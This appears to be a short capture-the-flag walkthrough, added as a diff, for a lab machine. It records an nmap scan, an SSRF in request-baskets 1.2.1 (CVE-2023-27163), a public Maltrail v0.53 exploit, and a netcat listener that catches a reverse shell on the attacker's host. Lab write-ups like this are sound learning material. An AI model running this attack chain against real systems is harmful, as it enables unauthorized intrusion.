@@ -1,0 +1,26 @@
+sudo nmap 10.10.11.224 -sV -sS -Pn -T4
+
+nmap results:
+    Service scan Timing: About 100.00% done; ETC: 18:22 (0:00:00 remaining)
+    Nmap scan report for 10.10.11.224
+    Host is up (0.16s latency).
+    Not shown: 997 closed tcp ports (reset)
+    PORT      STATE    SERVICE VERSION
+    22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+    80/tcp    filtered http
+    55555/tcp open     unknown
+
+added ip of the machine to /etc/hosts
+
+using firefox 10.10.11.224:55555 i manage to enter to web page
+
+in the page i found that the page uses  request-baskets | Version: 1.2.1 
+
+downloaded a script (https://github.com/entr0pie/CVE-2023-27163) to create a vulnerable basket 
+
+found that a basket runs on Maltrail (v0.53)
+
+after a google search found a weaponized script (https://github.com/spookier/Maltrail-v0.53-Exploit.git)
+
+using python3 exploit.py 10.10.16.92 8000 http://10.10.11.224:55555/eicfsm i managed to get to machine(enabled nc -lvp 8000 before the start)
+
